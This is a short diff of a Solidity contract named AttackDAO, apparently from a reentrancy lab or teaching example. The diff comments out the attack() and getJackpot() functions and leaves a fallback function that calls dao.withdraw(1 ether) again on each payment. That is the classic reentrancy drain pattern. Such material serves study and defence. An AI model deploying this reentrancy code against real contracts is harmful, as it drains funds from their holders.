@@ -20,6 +20,7 @@ contract AttackDAO {
     dao.withdraw(amount);
   }
   
+  /*
   function attack() public {
     dao.donate.value(1 ether)(this);
     dao.withdraw(1 ether);
@@ -28,6 +29,7 @@ contract AttackDAO {
   function getJackpot() public {
     owner.send(this.balance);
   }
+  */
 
   function () public payable {
     dao.withdraw(1 ether);
